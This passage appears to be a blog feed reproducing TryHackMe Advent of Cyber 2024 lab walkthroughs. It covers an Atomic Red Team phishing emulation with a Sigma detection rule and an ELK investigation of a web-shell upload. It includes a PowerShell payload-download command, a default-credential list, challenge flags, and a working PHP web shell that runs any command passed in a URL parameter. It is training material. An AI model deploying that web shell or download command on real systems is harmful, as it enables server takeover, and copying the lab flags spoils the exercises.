<span class="nx">Done</span> <span class="nx">executing</span> <span class="nx">test</span><span class="p">:</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span><span class="o">-</span><span class="mi">1</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>

</code></pre></div></div>

<p>Next, go to the Event Viewer and right-click on the <strong>Operational</strong> log on the left-hand side of the screen and then click on <strong>Refresh</strong>. There should be new events related to the emulated attack. Now sort the table on the Date and Time column to order the events chronologically (oldest first). The first two events of the list are tests that Atomic executes for every emulation. We are interested in 2 events that detail the attack:</p>

<ul>
  <li>First, a process was created for PowerShell to execute the following command: <code class="language-plaintext highlighter-rouge">"powershell.exe" &amp; {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}</code>.</li>
  <li>Then, a file was created with the name PhishingAttachment.xlsm.</li>
</ul>

<p>Click on each event to see the details. When you select an event, you should see a detailed overview of all the data collected for that event. Click on the <strong>Details</strong> tab to show all the <strong>EventData</strong> in a readable format. Let us take a look at the details of these events below. The data highlighted is valuable for incident response and creating alerting rules.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730736581670.png" alt="The results of executing the Atomic Test T1566.001 on the Windows Event Viewer." /></p>

<p>Navigate to the directory <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\AppData\Local\Temp\</code>, and open the file <code class="language-plaintext highlighter-rouge">PhishingAttachment.txt</code>. The flag included is the answer to question 1. Make sure to answer the question now, as the cleanup command will delete this file. \n</p>

<p>Let’s clean up the artefacts from our spearphishing emulation. Enter the command <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001-1 -cleanup</code>.</p>

<p>Now that we know which artefacts were created during this spearphishing emulation, we can use them to create custom alerting rules. In the next section, we will explore this topic further.</p>

<h2 id="alerting-on-the-atomic">Alerting on the Atomic</h2>

<p>In the previous paragraph, we found multiple indicators of compromise through the Sysmon event log. We can use this information to create detection rules to include in our EDR, SIEM, IDS, etc. These tools offer functionalities that allow us to import custom detection rules. There are several detection rule formats, including Yara, Sigma, Snort, and more. Let’s look at how we can implement the artefacts related to T1566.001 to create a custom Sigma rule.</p>

<p>Two events contained possible indicators of compromise. Let’s focus on the event that contained the <code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code> command line:</p>

<p><code class="language-plaintext highlighter-rouge">"powershell.exe" &amp; {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}"</code></p>

<p>We can use multiple parts of this artefact to include in our custom Sigma rule.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Invoke-WebRequest</code>: It is not common for this command to run from a script behind the scenes.</li>
  <li><code class="language-plaintext highlighter-rouge">$url = 'http://localhost/PhishingAttachment.xlsm'</code>: Attackers often use a specific malicious domain to host their payloads. Including the malicious URL in the Sigma rule could help us detect that specific URL.</li>
  <li><code class="language-plaintext highlighter-rouge">PhishingAttachment.xlsm</code>: This is the malicious payload downloaded and saved on our system. We can include its name in the Sigma rule as well.</li>
</ul>

<p>Combining all these pieces of information in a Sigma rule would look something like this:</p>

<p>PowerShell Invoke-WebRequest Sigma Rule</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">title</span><span class="p">:</span> <span class="nx">Detect</span> <span class="nx">PowerShell</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span> <span class="nx">and</span> <span class="nx">File</span> <span class="nx">Creation</span> <span class="k">of</span> <span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span>
  <span class="nx">id</span><span class="p">:</span> <span class="mi">1</span>
  <span class="nx">description</span><span class="p">:</span> <span class="nx">Detects</span> <span class="nx">the</span> <span class="nx">usage</span> <span class="k">of</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span> <span class="nx">to</span> <span class="nx">download</span> <span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span> <span class="nx">and</span> <span class="nx">the</span> <span class="nx">creation</span> <span class="k">of</span> <span class="nx">the</span> <span class="nx">file</span> <span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span><span class="p">.</span>
 <span class="nx">status</span><span class="p">:</span> <span class="nx">experimental</span>
  <span class="nx">author</span><span class="p">:</span> <span class="nx">TryHackMe</span>
  <span class="nx">logsource</span><span class="p">:</span>
    <span class="nx">category</span><span class="p">:</span> <span class="nx">process_creation</span>
    <span class="nx">product</span><span class="p">:</span> <span class="nx">windows</span>
    <span class="nx">service</span><span class="p">:</span> <span class="nx">sysmon</span>
  <span class="nx">detection</span><span class="p">:</span>
   <span class="nx">selection_invoke_webrequest</span><span class="p">:</span>
      <span class="nx">EventID</span><span class="p">:</span> <span class="mi">1</span>
      <span class="nx">CommandLine</span><span class="o">|</span><span class="nx">contains</span><span class="p">:</span>
        <span class="o">-</span> <span class="dl">'</span><span class="s1">Invoke-WebRequest</span><span class="dl">'</span>
        <span class="o">-</span> <span class="dl">'</span><span class="s1">http://localhost/PhishingAttachment.xlsm</span><span class="dl">'</span>

    <span class="nx">selection_file_creation</span><span class="p">:</span>
      <span class="nx">EventID</span><span class="p">:</span> <span class="mi">11</span>  <span class="err">#</span> <span class="nx">Sysmon</span> <span class="nx">Event</span> <span class="nx">ID</span> <span class="k">for</span> <span class="nx">File</span> <span class="nx">Creation</span>
      <span class="nx">TargetFilename</span><span class="o">|</span><span class="nx">endswith</span><span class="p">:</span> <span class="dl">'</span><span class="se">\</span><span class="s1">PhishingAttachment.xlsm</span><span class="dl">'</span>

    <span class="nx">condition</span><span class="p">:</span> <span class="nx">selection_invoke_webrequest</span> <span class="nx">or</span> <span class="nx">selection_file_creation</span>
  <span class="nx">falsepositives</span><span class="p">:</span>
    <span class="o">-</span> <span class="nx">Legitimate</span> <span class="nx">administration</span> <span class="nx">activity</span> <span class="nx">may</span> <span class="nx">use</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span><span class="p">,</span> <span class="nx">and</span> <span class="nx">legitimate</span> <span class="nx">Excel</span> <span class="nx">files</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">created</span> <span class="kd">with</span> <span class="nx">similar</span> <span class="nx">names</span><span class="p">.</span>
  <span class="nx">level</span><span class="p">:</span> <span class="nx">high</span>
  <span class="nx">tags</span><span class="p">:</span>
    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1071</span><span class="p">.</span><span class="mi">001</span>   <span class="err">#</span> <span class="nx">Web</span> <span class="nx">Service</span> <span class="o">-</span> <span class="nx">Application</span> <span class="nx">Layer</span> <span class="nx">Protocol</span>
    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1059</span><span class="p">.</span><span class="mi">001</span>   <span class="err">#</span> <span class="nx">PowerShell</span>
    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1105</span>       <span class="err">#</span> <span class="nx">Ingress</span> <span class="nx">Tool</span> <span class="nx">Transfer</span>
    <span class="o">-</span> <span class="nx">attack</span><span class="p">.</span><span class="nx">t1566</span><span class="p">.</span><span class="mi">001</span>   <span class="err">#</span> <span class="nx">Spearphishing</span> <span class="nx">Attachment</span>

</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">detection</code> part is where the effective detection is happening. We can see clearly the artefacts that we discovered during the emulation test. We can then import this rule into the main tools we use for alerts, such as the EDR, SIEM, XDR, and many more.</p>

<p>Now that Glitch has shown us his intentions, let’s continue with his work and run an emulation for ransomware.</p>

<h2 id="challenge">Challenge</h2>

<p>As Glitch continues to prepare for SOC-mas and fortifies Wareville’s security, he decides to conduct an attack simulation that would mimic a ransomware attack across the environment. He is unsure of the correct detection metrics to implement for this test and asks you for help. Your task is to identify the correct atomic test to run that will take advantage of <strong>a command and scripting interpreter</strong>, conduct the test, and extract valuable artefacts that would be used to craft a detection rule.</p>

<p>Answer the questions below</p>

<p>:::tip
What was the flag found in the .txt file that is found in the same directory as the PhishingAttachment.xslm artefact?</p>

<p>:::</p>

<p>THM{GlitchTestingForSpearphishing}</p>

<p>:::tip
What ATT&amp;CK technique ID would be our point of interest?</p>

<p>:::</p>

<p>T1059</p>

<p>:::tip
What ATT&amp;CK subtechnique ID focuses on the Windows Command Shell?</p>

<p>:::</p>

<p>T1059.003</p>

<p>:::tip
What is the name of the Atomic Test to be simulated?</p>

<p>:::</p>

<p>Simulate BlackByte Ransomware Print Bombing</p>

<p>:::tip
What is the name of the file used in the test?</p>

<p>:::</p>

<p>Wareville_Ransomware.txt</p>

<p>:::tip
What is the flag found from this Atomic Test?</p>

<p>:::</p>

<p>THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}</p>

<p>Learn more about the <a href="https://tryhackme.com/r/room/atomicredteam">Atomic Red Team</a> via the linked room.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[Based on the eventSource field, what AWS service generates the ConsoleLogin event?Day 4]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day4Header.png" /><media:content medium="image" url="http://localhost:4000/Day4Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hack Me Advent of Cyber - Day 3</title><link href="http://localhost:4000/Day3" rel="alternate" type="text/html" title="Try Hack Me Advent of Cyber - Day 3" /><published>2024-12-03T00:00:00-05:00</published><updated>2024-12-03T00:00:00-05:00</updated><id>http://localhost:4000/Day3</id><content type="html" xml:base="http://localhost:4000/Day3"><![CDATA[<p>| **:Advent of Cyber: New Task Release!** Even if I wanted to go, their vulnerabilities wouldn’t allow it. |
|—-|</p>

<table>
  <thead>
    <tr>
      <th><img src="https://ci3.googleusercontent.com/meips/ADKq_Na3wN1_grm57GwLvH_0tnfSAroTdFFJZyJalxT9b51NtilSwYCQnMCDc-8919fWyBL79vBULcij74MARv5MoQO275Uvouox3btQta5XgmOrN7dc87Dcrm1pK2kMMFoYLdnnXX_A9IbJ1mOu-U-hrEm11iYkq2Lu4DCP2YtsrNr3H7iOvmkwe2CSUJzqTz0jC_yawCsflLxzkFzT_bIfSLhxLAh7b1YuyQHn5gQVq8lFlw=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731418813195_Glitch%20-%20AoC%20Character%20Card%20326px_01JCG9MX80PEFE5CD2SW7T3B1T.png" alt="" /> \n  \n In day 3 of Advent of Cyber, Glitch attends a security conference only to realise that their web application is not secure. The SOC team investigates. </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td> </td>
    </tr>
    <tr>
      <td>**Topics Covered:**  \n Log analysis (Web app logs and attacks)</td>
    </tr>
  </tbody>
</table>

<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420330182.png" alt="Task banner for DAY 3" /></p>

<p>Today’s AoC challenge follows a rather unfortunate series of events for the Glitch. Here is a little passage which sets the scene for today’s task:</p>

<blockquote>
  <p><em>Late one Christmas evening the Glitch had a feeling,</em></p>

  <p><em>Something forgotten as he stared at the ceiling.</em></p>

  <p><em>He got up out of bed and decided to check,</em></p>

  <p><em>A note on his wall: ”Two days! InsnowSec”.</em></p>

  <p><br />
<em>With a click and a type he got his hotel and tickets,</em></p>

  <p><em>And sank off to sleep to the sound of some crickets.</em></p>

  <p><em>Luggage in hand, he had arrived at Frosty Pines,</em></p>

  <p><em>“To get to the conference, just follow the signs”.</em></p>

  <p><br />
<em>Just as he was ready the Glitch got a fright,</em></p>

  <p><em>An RCE vulnerability on their website ?!?</em></p>

  <p><em>He exploited it quick and made a report,</em></p>

  <p><em>But before he could send arrived his transport.</em></p>

  <p><br />
<em>In the Frosty Pines SOC they saw an alert,</em></p>

  <p><em>This looked quite bad, they called an expert.</em></p>

  <p><em>The request came from a room, but they couldn’t tell which,</em></p>

  <p><em>The logs saved the day, it was the room of…the Glitch.</em></p>
</blockquote>

<p>\n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310037301.png" alt="Frosty Pines Hotel Graphic" /> \n</p>

<p>In this task, we will cover how the SOC team and their expert were able to find out what had happened (Operation Blue) and how the Glitch was able to gain access to the website in the first place (Operation Red). Let’s get started, shall we? \n</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Learn about Log analysis and tools like ELK.</li>
  <li>Learn about KQL and how it can be used to investigate logs using ELK.</li>
  <li>Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731423722811.png" alt="AoC connection card -a VM and AttackBox needs to be started" /> \n</p>

<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine for the practical. The practical VM may take 5 minutes to become accessible.</p>

<p>You will also need to start the AttackBox by pressing the <code class="language-plaintext highlighter-rouge">Start AttackBox</code> button at the top of the room. Alternatively, you can connect your own hacking machine by using the TryHackMe VPN.</p>

<h2 id="operation-blue">OPERATION BLUE</h2>

<p>In this section of the lesson, we will take a look at what tools and knowledge is required for the <em>blue</em> segment, that is the investigation of the attack itself using tools which enable is to analyse the logs.</p>

<p>For the first part of Operation Blue, we will demonstrate how to use ELK to analyse the logs of a demonstration web app - WareVille Rails. Feel free to following along for practice.</p>

<h2 id="log-analysis--introducing-elk">Log Analysis &amp; Introducing ELK</h2>

<p>Log analysis is crucial to blue-teaming work, as you have likely discovered through this year’s Advent of Cyber.</p>

<p>Analysing logs can quickly become overwhelming, especially if you have multiple devices and services. ELK, or Elasticsearch, Logstash, and Kibana, combines data analytics and processing tools to make analysing logs much more manageable. ELK forms a dedicated stack that can aggregate logs from multiple sources into one central place.</p>

<p>Explaining how ELK collates and processes these logs is out of the scope of today’s task. However, if you wish to learn more, you can check out the <a href="https://tryhackme.com/r/room/investigatingwithelk101">Investigating with ELK 101</a> room. For now, it’s important to note that multiple processes behind the scenes achieve this.</p>

<p>The first part of today’s task is to investigate the attack on Frosty Pines Resort’s Hotel Management System to see what it looks like to a blue teamer. You will then test your web app skills by recreating the attack.</p>

<h2 id="using-elk">Using ELK</h2>

<p>Upon loading the URL <a href="http://MACHINE_IP:5601/">http://MACHINE_IP:5601/</a> within your AttackBox’s browser, you will be greeted with the ELK Home page.</p>

<p>For today’s task, we will use Kibana’s <strong>Discover</strong> interface to review Apache2 logs. To access this, simply click on the three lines located at the top left of the page to open the slide-out tray. Under the <strong>Analytics</strong> heading, click on <strong>Discover</strong>.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/1.gif" alt="Click on discover gif" /></p>

<p>We will need to select the collection that is relevant to us. A collection is a group of logs. For this stage of Operation Blue, we will be reviewing the logs present within the “wareville-rails” collection. To select this collection, click on the dropdown on the left of the display.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731407486561.png" alt="selecting the &quot;wareville-rails&quot; index pattern in ELK" /></p>

<p>Once you have done this, you will be greeted with a screen saying, “No results match your search criteria”. This is because no logs have been ingested within the last 15 minutes. Do not panic; we will discuss how to change this shortly.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/2.png" alt="Opening the Kibana discover page, after selecting the collection that we wish to use. Note here that no logs are shown, because the time range is set to the last 15 minutes." /></p>

<p>To change the date and time, click the text located on the right side of the box that has the calendar icon. Select ”<strong>Absolute”</strong> from the dropdown, where you can now select the start date and time. Next, click on the text on the right side of the arrow to and repeat the process for the end date and time.</p>

<p>For the WareVille Rails collection, we will need to set the start time to <strong>October 1 2024 00:00:00</strong>, and the end time to <strong>October 1 23:59:59</strong></p>

<p>If you are stuck, refer to the GIF below. Please note that the day and time in this demonstration of WareVille Rails will differ from the times required to review the FrostyPines Resorts collection in the second half of the practical .</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/3.gif" alt="A GIF showing how to modify the time range within Kibana" /></p>

<p>Now that we can see some entries, let’s go over the basics of the Kibana Discover UI.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/4.png" alt="Kibana discovery UI" /></p>

<ol>
  <li><strong>Search Bar:</strong> Here, we can place our search queries using KQL</li>
  <li><strong>Index Pattern:</strong> An index pattern is a collection of logs. This can be from a specific host or, for example, multiple hosts with a similar purpose (such as multiple web servers). In this case, the index pattern is all logs relating to ”wareville-rails”</li>
  <li><strong>Fields:</strong> This pane shows us the fields that Elasticsearch has parsed from the logs. For example, timestamp, response type, and IP address.</li>
  <li><strong>Timeline:</strong> This visualisation displays the event count over a period of time</li>
  <li><strong>Documents (Logs):</strong> These entries are the specific entries in the log file</li>
  <li><strong>Time Filter:</strong> We can use this to narrow down a specific time frame (absolute). Alternatively, we can search for logs based on relativity. I.e. ”Last 7 days”.</li>
</ol>

<h2 id="kibana-query-language-kql">Kibana Query Language (KQL)</h2>

<p>KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values. For example, querying if a value within a field exists or matches a value. If you are familiar with Splunk, you may be thinking of SPL (Search Processing Language).</p>

<p>For example, the query to search all documents for an IP address may look like <code class="language-plaintext highlighter-rouge">ip.address: "10.10.10.10"</code>. \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420515473.png" alt="IP address query" /> \n</p>

<p>Alternatively, Kibana also allows using Lucene query, an advanced language that supports features such as fuzzy terms (searches for terms that are similar to the one provided), regular expressions, etc. For today’s task, we will stick with using KQL, which has been enabled by default. The table below contains a mini-cheatsheet for KQL syntax that you may find helpful in today’s task.</p>

<table>
  <thead>
    <tr>
      <th><strong>Query/Syntax</strong></th>
      <th><strong>Description</strong></th>
      <th><strong>Example</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>” “</td>
      <td>The two quotation marks are used to search for specific values within the documents. Values in quotation marks are used for <strong>exact</strong> searches.</td>
      <td>“TryHackMe”</td>
    </tr>
    <tr>
      <td>*</td>
      <td>The asterisk denotes a wildcard, which searches documents for similar matches to the value provided.</td>
      <td>United* (would return United Kingdom and United States)</td>
    </tr>
    <tr>
      <td>OR</td>
      <td>This logical operator is used to show documents that contain <strong>either</strong> of the values provided.</td>
      <td>“United Kingdom” OR “England”</td>
    </tr>
    <tr>
      <td>AND</td>
      <td>This logical operator is used to show documents that contain <strong>both</strong> values.</td>
      <td>“Ben” AND “25”</td>
    </tr>
    <tr>
      <td>:</td>
      <td>This is used to search the (specified) field of a document for a value, such as an IP address. Note that the field you provide here will depend on the fields available in the index pattern.</td>
      <td>ip.address: 10.10.10.10</td>
    </tr>
  </tbody>
</table>

<h2 id="investigating-a-web-attack-with-elk">Investigating a Web Attack With ELK</h2>

<p>**Scenario:** Thanks to our extensive intrusion detection capabilities, our systems alerted the SOC team to a web shell being uploaded to the WareVille Rails booking platform on Oct 1, 2024. Our task is to review the web server logs to determine how the attacker achieved this. \n</p>

<p>If you would like to follow along, ensure that you have the “<strong>wareville-rails</strong>” collection selected like so:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408967537.png" alt="selecting the wareville-rails collection within ELK to follow along with this stage of operation blue" /> \n</p>

<p>To investigate this scenario, let’s change the time filter to show events for the day of the attack, setting the start date and time to “<strong>Oct 1, 2024 @ 00:00:00.000</strong>” and the end date and time to “<strong>Oct 2, 2024 @ 00:00:00.000</strong>”.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/6.png" alt="October 1st - 2nd Date range" /> \n</p>

<p>You will see the logs have now populated within the display. Please note that the quantity of entries (hits) in this task may differ to the amount on the practical VM.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/7.png" alt="Logs" /></p>

<p>An incredibly beneficial feature of ELK is that we can filter out noise. A web server (especially a popular one) will likely have a large number of logs from user traffic—completely unrelated to the attack. Using the fields pane on the left, we can click on the “<strong>+</strong>” and “<strong>-</strong>” icons next to the field to show only that value or to remove it from the display, respectively.</p>

<p><strong>Fun fact:</strong> Clicking on these filters is actually just applying the relevant KQL syntax.</p>

<p>Note in the GIF below how the logs are being filtered to only show logs containing the IP address 10.13.27.115 (reducing the count from 1,028 to 423 hits). We can combine filtering multiple fields in or out to drill down specifically into the logs.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/8.gif" alt="IP filtering narrow down gif" /> \n</p>

<p>To remove applied filters, simply click on the “<strong>x</strong>” alongside the filter, just below the search bar. \n</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/9.png" alt="Filters image" /></p>

<p>In this investigation, let’s look at the activity of the IP address 10.9.98.230. We can click on the “clientip” field to see the IPs with the most values.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/10.png" alt="IP with most values" /></p>

<p>Using the timeline at the top, we can see a lot of activity from this IP address took place between 11:30:00 and 11:35:00. This would be a good place to begin our analysis.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/11.png" alt="Timeline narrowed down" /></p>

<p>Each log can be expanded by using the ”<strong>&gt;</strong>“ icon located on the left of the log/document. Fortunately, the logs are pretty small in this instance, so we can browse through them to look for anything untoward. \n</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/12.gif" alt="log" /></p>

<p>After some digging, a few logs stand out. Looking at the <strong>request</strong> field, we can see that a file named “shell.php” has been accessed, with a few parameters “<strong>c</strong>“ and “<strong>d</strong>“ containing commands. These are likely to be commands input into some form of web shell. \n</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/13.png" alt="Web shell input commands logs" /></p>

<p>Now that we have an initial lead, let’s use a search query to find all logs that contain “<strong>shell.php</strong>”. Using the search bar at the top, the query <code class="language-plaintext highlighter-rouge">message: "shell.php"</code> will search for all entries of “<strong>shell.php</strong>“ in the message field of the logs.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/blue/14.png" alt="shell.php narrow down" /></p>

<h2 id="operation-red">OPERATION RED</h2>

<p>In this section we will now take a look at the <em>red</em> aspect. In other words, the attack itself and how it was carried out.</p>

<h2 id="why-do-websites-allow-file-uploads">Why Do Websites Allow File Uploads</h2>

<p>File uploads are everywhere on websites, and for good reason. Users often need to upload files like profile pictures, invoices, or other documents to update their accounts, send receipts, or submit claims. These features make the user experience smoother and more efficient. But while this is convenient, it also creates a risk if file uploads aren’t handled properly. If not properly secured, this feature can open up various vulnerabilities attackers can exploit.</p>

<h2 id="file-upload-vulnerabilities">File Upload Vulnerabilities</h2>

<p>File upload vulnerabilities occur when a website doesn’t properly handle the files that users upload. If the site doesn’t check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:</p>

<ul>
  <li><strong>RCE</strong>: Uploading a script that the server runs gives the attacker control over it.</li>
  <li><strong>XSS</strong>: Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker’s server.</li>
</ul>

<p>These can happen if a site doesn’t properly secure its file upload functionality.</p>

<h2 id="why-unrestricted-file-uploads-are-dangerous">Why Unrestricted File Uploads Are Dangerous</h2>

<p>Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file’s contents aren’t properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.</p>

<p>Examples of abuse through unrestricted file uploads include:</p>

<ul>
  <li>Uploading a script that the server executes, leading to RCE.</li>
  <li>Uploading a crafted image file that triggers a vulnerability when processed by the server.</li>
  <li>Uploading a web shell and browsing to it directly using a browser.</li>
</ul>

<h2 id="usage-of-weak-credentials">Usage of Weak Credentials</h2>

<p>One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.</p>

<p>Below are some examples of weak/default credentials that attackers might try:</p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th><strong>Password</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>admin</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>administrator</td>
      <td>administrator</td>
    </tr>
    <tr>
      <td>admin@domainname</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>guest</td>
      <td>guest</td>
    </tr>
  </tbody>
</table>

<p>Attackers can use tools or try these common credentials manually, which is often all it takes to break into the system.</p>

<h2 id="what-is-remote-code-execution-rce">What is Remote Code Execution (RCE)</h2>

<p>Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310085341.png" alt="Frosty Pines Hotel Key Graphic" /> \n</p>

<h2 id="what-is-a-web-shell">What Is a Web Shell</h2>

<p>A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.</p>

<p>For example, attackers could use a web shell to:</p>

<ul>
  <li>Execute commands on the server</li>
  <li>Move laterally within the network</li>
  <li>Download sensitive data or pivot to other services</li>
</ul>

<p>A web shell typically gives the attacker a web-based interface to run commands. Still, in some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.</p>

<p>Okay, now that we’re familiar with a remote code execution vulnerability and how it works, let’s take a look at how we would exploit it!</p>

<h2 id="practice-makes-perfect">Practice Makes Perfect</h2>

<p>To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today’s task, we will demonstrate achieving RCE via unrestricted file upload within an <a href="https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System">open-source railway management system</a> that has this vulnerability<a href="https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md"> built into it</a>.</p>

<h2 id="exploiting-rce-via-file-upload">Exploiting RCE via File Upload</h2>

<p>Now we’re going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.</p>

<p>Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">command</span><span class="dl">"</span> <span class="nx">autofocus</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">command</span><span class="dl">"</span> <span class="nx">size</span><span class="o">=</span><span class="dl">"</span><span class="s2">50</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">Execute</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="p">?</span><span class="nx">php</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">isset</span><span class="p">(</span><span class="nx">$_GET</span><span class="p">[</span><span class="dl">'</span><span class="s1">command</span><span class="dl">'</span><span class="p">]))</span>
    <span class="p">{</span>
        <span class="nf">system</span><span class="p">(</span><span class="nx">$_GET</span><span class="p">[</span><span class="dl">'</span><span class="s1">command</span><span class="dl">'</span><span class="p">]</span> <span class="p">.</span> <span class="dl">'</span><span class="s1"> 2&gt;&amp;1</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">?</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/pre</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
